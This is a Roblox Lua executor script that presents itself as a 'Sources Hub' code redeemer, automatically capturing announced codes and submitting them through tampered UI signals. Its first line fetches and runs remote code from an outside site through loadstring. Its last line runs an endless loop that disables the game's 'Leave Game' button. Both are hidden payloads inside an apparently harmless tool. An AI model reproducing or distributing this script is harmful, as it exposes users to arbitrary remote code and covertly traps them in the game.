loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LP = Players.LocalPlayer
local PlayerGui = LP:WaitForChild("PlayerGui")

local getupvalues = (debug and debug.getupvalues) or getupvalues
local getconns    = getconnections or (debug and debug.getconnections)
local setupv      = (debug and debug.setupvalue) or setupvalue

local function isOurGui(instance)
    local p = instance
    for _ = 1, 10 do
        if not p then break end
        if p.Name == "SourcesHubRedeemerGui" then return true end
        p = p.Parent
    end
    return false
end

local function findAllTextBoxes(pg)
    local boxes = {}
    for _, gui in ipairs(pg:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Enabled and gui.Name ~= "SourcesHubRedeemerGui" then
            for _, d in ipairs(gui:GetDescendants()) do
                if d:IsA("TextBox") and not isOurGui(d) then
                    boxes[#boxes+1] = d
                end
            end
        end
    end
    return boxes
end

local function isVisibleChain(inst)
    local current = inst
    while current do
        if current:IsA("GuiObject") then
            if not current.Visible then return false end
        end
        if current:IsA("ScreenGui") then
            if not current.Enabled then return false end
            return true
        end
        current = current.Parent
    end
    return true
end

local function findCodeButtons(pg)
    local btns = {}
    for _, gui in ipairs(pg:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Enabled and gui.Name ~= "SourcesHubRedeemerGui" then
            for _, d in ipairs(gui:GetDescendants()) do
                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                    local n  = d.Name:lower()
                    local pn = (d.Parent and d.Parent.Name or ""):lower()
                    if (n:find("code") or n:find("redeem") or pn:find("code") or pn:find("redeem"))
                        and isVisibleChain(d) then
                        btns[#btns+1] = d
                    end
                end
            end
        end
    end
    return btns
end

local function clickButton(btn)
    if not btn then return false end
    local methods = {}
    
    methods[#methods+1] = function() btn.MouseButton1Click:Fire() end
    methods[#methods+1] = function() btn.Activated:Fire() end
    
    if typeof(firesignal) == "function" then
        methods[#methods+1] = function() firesignal(btn.MouseButton1Click) end
        methods[#methods+1] = function() firesignal(btn.Activated) end
    end
    
    if typeof(getconns) == "function" then
        methods[#methods+1] = function()
            local ok, cs = pcall(getconns, btn.MouseButton1Click)
            if ok and type(cs) == "table" then
                for _, c in ipairs(cs) do pcall(function() c:Fire() end) end
            end
            local ok2, cs2 = pcall(getconns, btn.Activated)
            if ok2 and type(cs2) == "table" then
                for _, c in ipairs(cs2) do pcall(function() c:Fire() end) end
            end
        end
    end
    
    if typeof(fireclick) == "function" then
        methods[#methods+1] = function() fireclick(btn) end
    end
    
    local anyOk = false
    for _, fn in ipairs(methods) do
        local ok = pcall(fn)
        anyOk = anyOk or ok
    end
    return anyOk
end

local function writeCodeToBox(box, code)
    if not box then return false end
    pcall(function()
        box.Text = code
    end)
    return box.Text == code
end

local function fireBoxFocusLost(box)
    if not box then return false end
    local anyFired = false
    
    if typeof(firesignal) == "function" then
        local ok = pcall(firesignal, box.FocusLost, true)
        anyFired = anyFired or ok
    end
    
    if typeof(getconns) == "function" then
        local ok, cs = pcall(getconns, box.FocusLost)
        if ok and type(cs) == "table" then
            for _, c in ipairs(cs) do
                local fn
                pcall(function() fn = c.Function end)
                if fn and typeof(getupvalues) == "function" and typeof(setupv) == "function" then
                    local uOk, ups = pcall(getupvalues, fn)
                    if uOk and type(ups) == "table" then
                        for i, v in pairs(ups) do
                            if type(v) == "boolean" and v == true then
                                pcall(setupv, fn, i, false)
                            end
                        end
                    end
                end
                local fOk = pcall(function()
                    if c.Enabled ~= false then c:Fire(true) end
                end)
                anyFired = anyFired or fOk
            end
        end
    end
    
    return anyFired
end

local function typeAndSubmitCode(code)
    if not LP then return false, "no LP" end
    local pg = LP:FindFirstChildOfClass("PlayerGui")
    if not pg then return false, "no PlayerGui" end

    local codesGui = pg:FindFirstChild("Codes")
    if codesGui then
        if codesGui:IsA("ScreenGui") then
            codesGui.Enabled = true
        end
        local codesFrame = codesGui:FindFirstChild("Codes") or codesGui
        if codesFrame then
            if codesFrame:IsA("GuiObject") then
                codesFrame.Visible = true
            end
            local cur = codesFrame
            while cur and cur ~= codesGui do
                if cur:IsA("GuiObject") then cur.Visible = true end
                cur = cur.Parent
            end

            local box = nil
            for _, d in ipairs(codesFrame:GetDescendants()) do
                if d:IsA("TextBox") and not isOurGui(d) then
                    box = d
                    break
                end
            end

            local submitBtn = nil
            for _, d in ipairs(codesFrame:GetDescendants()) do
                if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                    local n = d.Name:lower()
                    local txt = ""
                    pcall(function() txt = d.Text:lower() end)
                    if n:find("submit") or txt:find("submit") or n:find("redeem") or txt:find("redeem") or n:find("claim") or txt:find("confirm") or n:find("enter") then
                        submitBtn = d
                        break
                    end
                end
            end
            if not submitBtn then
                for _, d in ipairs(codesFrame:GetDescendants()) do
                    if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) then
                        local n = d.Name:lower()
                        if not n:find("close") and not n:find("x") and not n:find("toggle") then
                            submitBtn = d
                            break
                        end
                    end
                end
            end

            if box then
                writeCodeToBox(box, code)
                task.wait(0.05)
                if submitBtn then
                    clickButton(submitBtn)
                end
                fireBoxFocusLost(box)
                return true, "submitted via PlayerGui.Codes.Codes"
            end
        end
    end

    local function tryOpenPanel()
        local btns = findCodeButtons(pg)
        for _, btn in ipairs(btns) do
            clickButton(btn)
            task.wait(0.05)
        end
        return #btns > 0
    end

    tryOpenPanel()
    task.wait(0.3)

    local box = nil
    local deadline = tick() + 3
    while tick() < deadline do
        local allBoxes = findAllTextBoxes(pg)
        for _, d in ipairs(allBoxes) do
            if isVisibleChain(d) then
                local n   = d.Name:lower()
                local pn  = (d.Parent and d.Parent.Name or ""):lower()
                if n:find("code") or pn:find("code") or n:find("redeem") or pn:find("redeem") or n:find("input") or pn:find("input") or n:find("textbox") or n:find("enter") then
                    box = d
                    break
                end
            end
        end
        if not box then
            for _, d in ipairs(allBoxes) do
                if isVisibleChain(d) then box = d; break end
            end
        end
        if box then break end
        task.wait(0.1)
    end

    if not box then return false, "no codebox visible" end

    writeCodeToBox(box, code)
    task.wait(0.05)

    local redeemBtn = nil
    local searchNames = {"submit","redeem","claim","confirm","enter","send","apply","ok","use","go","check"}
    local p = box.Parent
    for _ = 1, 8 do
        if not p then break end
        for _, d in ipairs(p:GetDescendants()) do
            if (d:IsA("TextButton") or d:IsA("ImageButton")) and not isOurGui(d) and d ~= box then
                local n = d.Name:lower()
                local txt = ""
                pcall(function() txt = d.Text:lower() end)
                for _, sn in ipairs(searchNames) do
                    if n:find(sn) or txt:find(sn) then
                        if isVisibleChain(d) then
                            redeemBtn = d
                            break
                        end
                    end
                end
                if redeemBtn then break end
            end
        end
        if redeemBtn then break end
        p = p.Parent
    end

    if redeemBtn then
        clickButton(redeemBtn)
    end

    fireBoxFocusLost(box)

    return true, "fallback methods used"
end

local function resolveNotifyRemote()
    if _G.PhiNotifyRemote then return _G.PhiNotifyRemote end
    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
    local getinfo = debug and (debug.getinfo or debug.info)
    if getgc and getinfo and getconnections then
        for _, d in ipairs(Net:GetDescendants()) do
            if d:IsA("RemoteEvent") then
                local ok, cs = pcall(getconnections, d.OnClientEvent)
                if ok then
                    for _, c in ipairs(cs) do
                        local f, fn = pcall(function() return c.Function end)
                        if f and type(fn) == "function" then
                            local i, info = pcall(getinfo, fn)
                            if i and tostring(info.short_src or info.source or ""):find("NotificationController", 1, true) then
                                return d
                            end
                        end
                    end
                end
            end
        end
    end
    return nil
end

local notifyRemote = resolveNotifyRemote()
if not notifyRemote then
    warn("[Sources Hub] Notification remote not found - announcements won't be captured.")
end

if PlayerGui:FindFirstChild("SourcesHubRedeemerGui") then
    PlayerGui.SourcesHubRedeemerGui:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SourcesHubRedeemerGui"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = PlayerGui

-- Main Container (Translucent White)
local mainFrame = Instance.new("ImageLabel")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 300, 0, 205)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -102)
mainFrame.BackgroundColor3 = Color3.fromRGB(245, 245, 248)
mainFrame.BackgroundTransparency = 0.1
mainFrame.Image = "rbxassetid://93857225029776"
mainFrame.ImageTransparency = 0.85 
mainFrame.ScaleType = Enum.ScaleType.Crop
mainFrame.BorderSizePixel = 0
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 16)
mainCorner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(255, 255, 255)
mainStroke.Thickness = 1.5
mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
mainStroke.Parent = mainFrame

-- Top Bar Header
local topBar = Instance.new("Frame")
topBar.Name = "TopBar"
topBar.Size = UDim2.new(1, 0, 0, 44)
topBar.Position = UDim2.new(0, 0, 0, 0)
topBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
topBar.BackgroundTransparency = 0.4
topBar.BorderSizePixel = 0
topBar.Parent = mainFrame

local topBarCorner = Instance.new("UICorner")
topBarCorner.CornerRadius = UDim.new(0, 16)
topBarCorner.Parent = topBar

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(0, 200, 0, 14)
titleLabel.Position = UDim2.new(0, 12, 0, 8)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "SOURCES HUB REDEEMER"
titleLabel.TextColor3 = Color3.fromRGB(80, 10, 15) -- Dark Maroon Title
titleLabel.TextSize = 11
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = topBar

local subLabel = Instance.new("TextLabel")
subLabel.Name = "Subtitle"
subLabel.Size = UDim2.new(0, 200, 0, 12)
subLabel.Position = UDim2.new(0, 12, 0, 25)
subLabel.BackgroundTransparency = 1
subLabel.Font = Enum.Font.Gotham
subLabel.Text = "discord.gg/sourceshubs"
subLabel.TextColor3 = Color3.fromRGB(120, 30, 35)
subLabel.TextSize = 10
subLabel.TextXAlignment = Enum.TextXAlignment.Left
subLabel.Parent = topBar

local statusDot = Instance.new("TextButton")
statusDot.Name = "StatusDot"
statusDot.Size = UDim2.new(0, 10, 0, 10)
statusDot.Position = UDim2.new(1, -18, 0, 17)
statusDot.BackgroundColor3 = Color3.fromRGB(220, 40, 50)
statusDot.BorderSizePixel = 0
statusDot.Text = ""
statusDot.AutoButtonColor = false
statusDot.Parent = topBar

local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = statusDot

-- Start Scan Button
local scanButton = Instance.new("TextButton")
scanButton.Name = "ScanButton"
scanButton.Size = UDim2.new(1, -24, 0, 30)
scanButton.Position = UDim2.new(0, 12, 0, 52)
scanButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scanButton.BackgroundTransparency = 0.35
scanButton.BorderSizePixel = 0
scanButton.Font = Enum.Font.GothamBold
scanButton.Text = "START SCAN"
scanButton.TextColor3 = Color3.fromRGB(90, 12, 18)
scanButton.TextSize = 11
scanButton.AutoButtonColor = false
scanButton.Parent = mainFrame

local scanCorner = Instance.new("UICorner")
scanCorner.CornerRadius = UDim.new(0, 10)
scanCorner.Parent = scanButton

local scanStroke = Instance.new("UIStroke")
scanStroke.Color = Color3.fromRGB(255, 255, 255)
scanStroke.Thickness = 1
scanStroke.Parent = scanButton

-- Mode Selection Button
local modeButton = Instance.new("TextButton")
modeButton.Name = "ModeButton"
modeButton.Size = UDim2.new(1, -24, 0, 30)
modeButton.Position = UDim2.new(0, 12, 0, 88)
modeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
modeButton.BackgroundTransparency = 0.35
modeButton.BorderSizePixel = 0
modeButton.Font = Enum.Font.GothamBold
modeButton.Text = "MODE: 3 GLOBAL MESSAGES"
modeButton.TextColor3 = Color3.fromRGB(80, 85, 95)
modeButton.TextSize = 9
modeButton.AutoButtonColor = false
modeButton.Parent = mainFrame

local modeCorner = Instance.new("UICorner")
modeCorner.CornerRadius = UDim.new(0, 10)
modeCorner.Parent = modeButton

local modeStroke = Instance.new("UIStroke")
modeStroke.Color = Color3.fromRGB(255, 255, 255)
modeStroke.Thickness = 1
modeStroke.Parent = modeButton

-- Preview Code Textbox
local previewBox = Instance.new("TextBox")
previewBox.Name = "PreviewBox"
previewBox.Size = UDim2.new(1, -102, 0, 30)
previewBox.Position = UDim2.new(0, 12, 0, 126)
previewBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
previewBox.BackgroundTransparency = 0.35
previewBox.BorderSizePixel = 0
previewBox.PlaceholderText = "Captured code..."
previewBox.PlaceholderColor3 = Color3.fromRGB(130, 135, 145)
previewBox.Text = ""
previewBox.TextColor3 = Color3.fromRGB(40, 45, 55)
previewBox.ClearTextOnFocus = false
previewBox.Font = Enum.Font.GothamBold
previewBox.TextSize = 11
previewBox.TextXAlignment = Enum.TextXAlignment.Left
previewBox.Parent = mainFrame

local boxCorner = Instance.new("UICorner")
boxCorner.CornerRadius = UDim.new(0, 10)
boxCorner.Parent = previewBox

local boxStroke = Instance.new("UIStroke")
boxStroke.Color = Color3.fromRGB(255, 255, 255)
boxStroke.Thickness = 1
boxStroke.Parent = previewBox

local pad = Instance.new("UIPadding")
pad.PaddingLeft = UDim.new(0, 8)
pad.PaddingRight = UDim.new(0, 8)
pad.Parent = previewBox

-- Redeem Pill Button
local redeemButton = Instance.new("TextButton")
redeemButton.Name = "RedeemButton"
redeemButton.Size = UDim2.new(0, 70, 0, 30)
redeemButton.Position = UDim2.new(1, -82, 0, 126)
redeemButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
redeemButton.BorderSizePixel = 0
redeemButton.Text = "REDEEM"
redeemButton.TextColor3 = Color3.fromRGB(90, 12, 18)
redeemButton.Font = Enum.Font.GothamBold
redeemButton.TextSize = 10
redeemButton.AutoButtonColor = true
redeemButton.Parent = mainFrame

local redeemCorner = Instance.new("UICorner")
redeemCorner.CornerRadius = UDim.new(0, 10)
redeemCorner.Parent = redeemButton

local redeemStroke = Instance.new("UIStroke")
redeemStroke.Color = Color3.fromRGB(255, 255, 255)
redeemStroke.Thickness = 1
redeemStroke.Parent = redeemButton

-- Bottom Controls Row
local bottomRow = Instance.new("Frame")
bottomRow.Name = "BottomRow"
bottomRow.Size = UDim2.new(1, -24, 0, 30)
bottomRow.Position = UDim2.new(0, 12, 0, 162)
bottomRow.BackgroundTransparency = 1
bottomRow.Parent = mainFrame

local delayLabel = Instance.new("TextLabel")
delayLabel.Name = "DelayLabel"
delayLabel.Size = UDim2.new(0, 48, 1, 0)
delayLabel.Position = UDim2.new(0, 10, 0, 0)
delayLabel.BackgroundTransparency = 1
delayLabel.Font = Enum.Font.GothamBold
delayLabel.Text = "Delay:"
delayLabel.TextColor3 = Color3.fromRGB(90, 95, 105)
delayLabel.TextSize = 11
delayLabel.TextXAlignment = Enum.TextXAlignment.Left
delayLabel.Parent = bottomRow

local delayBox = Instance.new("TextBox")
delayBox.Name = "DelayBox"
delayBox.Size = UDim2.new(0, 48, 1, 0)
delayBox.Position = UDim2.new(0, 62, 0, 0)
delayBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
delayBox.BackgroundTransparency = 0.35
delayBox.BorderSizePixel = 0
delayBox.Text = "0.5"
delayBox.TextColor3 = Color3.fromRGB(40, 45, 55)
delayBox.Font = Enum.Font.GothamBold
delayBox.TextSize = 12
delayBox.TextXAlignment = Enum.TextXAlignment.Center
delayBox.ClearTextOnFocus = false
delayBox.Parent = bottomRow

local delayCorner = Instance.new("UICorner")
delayCorner.CornerRadius = UDim.new(0, 10)
delayCorner.Parent = delayBox

local delayStroke = Instance.new("UIStroke")
delayStroke.Color = Color3.fromRGB(255, 255, 255)
delayStroke.Thickness = 1
delayStroke.Parent = delayBox

local setButton = Instance.new("TextButton")
setButton.Name = "SetButton"
setButton.Size = UDim2.new(0, 70, 1, 0)
setButton.Position = UDim2.new(1, -70, 0, 0)
setButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
setButton.BorderSizePixel = 0
setButton.Text = "SET"
setButton.TextColor3 = Color3.fromRGB(90, 12, 18)
setButton.Font = Enum.Font.GothamBold
setButton.TextSize = 10
setButton.AutoButtonColor = true
setButton.Parent = bottomRow

local setCorner = Instance.new("UICorner")
setCorner.CornerRadius = UDim.new(0, 10)
setCorner.Parent = setButton

local setStroke = Instance.new("UIStroke")
setStroke.Color = Color3.fromRGB(255, 255, 255)
setStroke.Thickness = 1
setStroke.Parent = setButton

-- Hover Animations
local function applyHoverEffect(button)
    local defaultColor = button.BackgroundColor3
    local hoverColor = Color3.fromRGB(255, 255, 255)
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = hoverColor, BackgroundTransparency = 0.1}):Play()
    end)
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = defaultColor, BackgroundTransparency = 0.35}):Play()
    end)
end
applyHoverEffect(scanButton)
applyHoverEffect(modeButton)

local function whiteHover(btn)
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(240, 240, 245)}):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
    end)
end
whiteHover(setButton)
whiteHover(redeemButton)

statusDot.MouseButton1Click:Connect(function() screenGui:Destroy() end)

-- Mobile & PC Smooth Dragging Mechanics
local dragging, dragInput, dragStart, startPos
local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale,
        startPos.X.Offset + delta.X,
        startPos.Y.Scale,
        startPos.Y.Offset + delta.Y
    )
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

local scanning = false
local buffer = {}
local mode = 3
local delay = 0.5

local function updateDelay()
    local val = tonumber(delayBox.Text)
    if val and val >= 0.05 then
        delay = val
        print("[Sources Hub] Delay set to:", delay)
    else
        delayBox.Text = tostring(delay)
    end
end

delayBox.FocusLost:Connect(function(enter)
    if enter then updateDelay() end
end)

delayBox:GetPropertyChangedSignal("Text"):Connect(function()
    local val = tonumber(delayBox.Text)
    if val and val >= 0.05 then
        delay = val
    end
end)

setButton.MouseButton1Click:Connect(updateDelay)

local function isValidCode(msg)
    return msg:match("^[A-Za-z0-9]+$") ~= nil
end

local function updatePreview()
    if #buffer == 0 then
        previewBox.Text = ""
        return
    end
    local count = math.min(#buffer, mode)
    local combined = table.concat(buffer, "", 1, count)
    previewBox.Text = combined
end

local function processBuffer()
    if not scanning then return end
    while #buffer >= mode do
        local combined = table.concat(buffer, "", 1, mode)
        buffer = {}
        updatePreview()
        typeAndSubmitCode(combined)
        print("[Sources Hub] Auto-redeemed: " .. combined)
        task.wait(delay)
    end
    updatePreview()
end

local function onAnnouncement(txt)
    if not scanning or not txt or txt == "" then return end
    local msg = txt:match("^%s*(.-)%s*$")
    if msg and #msg > 0 and isValidCode(msg) then
        table.insert(buffer, msg)
        updatePreview()
        if #buffer >= mode then
            task.spawn(processBuffer)
        end
        print("[Sources Hub] Captured: " .. msg .. " (buffer: " .. #buffer .. ")")
    end
end

local function toggleScan()
    scanning = not scanning
    if scanning then
        scanButton.Text = "SCANNING..."
        scanButton.BackgroundColor3 = Color3.fromRGB(120, 220, 140)
        scanButton.BackgroundTransparency = 0.2
        statusDot.BackgroundColor3 = Color3.fromRGB(50, 200, 80)
        buffer = {}
        updatePreview()
        print("[Sources Hub] Scanning started.")
    else
        scanButton.Text = "START SCAN"
        scanButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        scanButton.BackgroundTransparency = 0.35
        statusDot.BackgroundColor3 = Color3.fromRGB(220, 40, 50)
        buffer = {}
        updatePreview()
        print("[Sources Hub] Scanning stopped.")
    end
end

scanButton.MouseButton1Click:Connect(toggleScan)

modeButton.MouseButton1Click:Connect(function()
    mode = (mode % 4) + 1
    modeButton.Text = "MODE: " .. mode .. " GLOBAL MESSAGE" .. (mode > 1 and "S" or "")
    updatePreview()
    if scanning and #buffer >= mode then
        task.spawn(processBuffer)
    end
end)

local function manualRedeem()
    local code = previewBox.Text
    if code and code ~= "" then
        typeAndSubmitCode(code)
        print("[Sources Hub] Manually redeemed: " .. code)
        buffer = {}
        updatePreview()
    end
end

redeemButton.MouseButton1Click:Connect(manualRedeem)

previewBox.FocusLost:Connect(function(enter)
    if enter then manualRedeem() end
end)

if notifyRemote then
    notifyRemote.OnClientEvent:Connect(function(txt, ...)
        onAnnouncement(txt)
    end)
else
    warn("[Sources Hub] No notify remote - announcements not captured.")
end

task.spawn(function() while task.wait() do pcall(function() for _,v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do v:Disable() end end) end end)

print("[Sources Hub] Ready. Click 'START SCAN' to begin.")
